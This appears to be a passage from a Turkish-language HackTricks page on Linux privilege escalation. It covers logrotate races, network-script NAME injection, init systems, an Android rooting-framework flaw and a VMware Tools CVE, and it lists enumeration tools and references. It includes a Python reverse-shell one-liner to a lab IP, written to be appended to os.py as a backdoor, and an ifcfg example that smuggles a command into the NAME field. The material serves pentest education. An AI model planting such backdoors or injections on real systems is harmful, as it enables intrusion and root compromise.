Bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasörün içine **yazabiliyorsanız** ya da **python libraries**'i değiştirebiliyorsanız, OS library'sini değiştirebilir ve ona backdoor ekleyebilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py library'sini kopyalayıp yapıştırın).

**Library'ye backdoor eklemek** için os.py library'sinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` içindeki bir zafiyet, bir log dosyasında veya onun üst dizinlerinde **write permissions** sahibi olan kullanıcıların potansiyel olarak yetki yükseltmesi elde etmesine izin verir. Bunun nedeni, çoğunlukla **root** olarak çalışan `logrotate`’ın keyfi dosyaları çalıştıracak şekilde manipüle edilebilmesi, özellikle de _**/etc/bash_completion.d/**_ gibi dizinlerde. Sadece _/var/log_ içindeki izinleri değil, log rotation uygulanan herhangi bir dizindeki izinleri de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve öncesini etkiler

Zafiyet hakkında daha ayrıntılı bilgi bu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile kullanabilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzer; bu yüzden logları değiştirebildiğinizi bulduğunuzda, bu logları kimin yönettiğini kontrol edin ve logları symlink’lerle değiştirerek yetki yükseltmesi yapıp yapamayacağınızı kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ içine bir `ifcf-<whatever>` scripti **write** edebiliyorsa **veya** mevcut bir tanesini **adjust** edebiliyorsa, o zaman **system is pwned**.

Network scripts, örneğin _ifcg-eth0_, network connections için kullanılır. Görünüşte .INI dosyalarına tamamen benzerler. Ancak Linux üzerinde Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scripts içindeki `NAME=` özniteliği doğru şekilde işlenmiyor. Eğer isimde **white/blank space** varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışır. Bu da **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı** anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ve /bin/id arasındaki boşluğu not edin_)

### **init, init.d, systemd, and rc.d**

`/etc/init.d` dizini, **scripts** için System V init (SysVinit), **klasik Linux service management system**’inin evidir. `start`, `stop`, `restart` ve bazen `reload` servisleri için scriptler içerir. Bunlar doğrudan ya da `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`’dir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir; bu, Ubuntu tarafından tanıtılan daha yeni bir **service management** sistemidir ve service management görevleri için configuration files kullanır. Upstart’a geçişe rağmen, uyumluluk katmanı nedeniyle SysVinit scriptleri Upstart configuration’larıyla birlikte hâlâ kullanılır.

**systemd**, ondemand daemon başlatma, automount yönetimi ve system state snapshots gibi gelişmiş özellikler sunan modern bir initialization ve service manager olarak ortaya çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenleyerek system administration sürecini sadeleştirir.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel functionality’yi bir userspace manager’a açığa çıkarmak için bir syscall hook’lar. Zayıf manager authentication (örn. FD-order’a dayalı signature checks veya kötü password şemaları), yerel bir app’in manager’ı taklit etmesine ve zaten-rooted cihazlarda root’a yükselmesine izin verebilir. Daha fazla bilgi ve exploitation detayları burada:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex-driven service discovery, process command lines içinden bir binary path çıkarıp onu ayrıcalıklı bir context altında -v ile execute edebilir. Esnek patterns (örn. \S kullanımı), writable location’larda (örn. /tmp/httpd) attacker-staged listeners ile eşleşebilir ve root olarak execution’a yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi alın ve burada diğer discovery/monitoring stack’lere uygulanabilir genelleştirilmiş bir pattern görün:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors için bakılacak en iyi tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC içinde kernel vulns enumerate eder [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
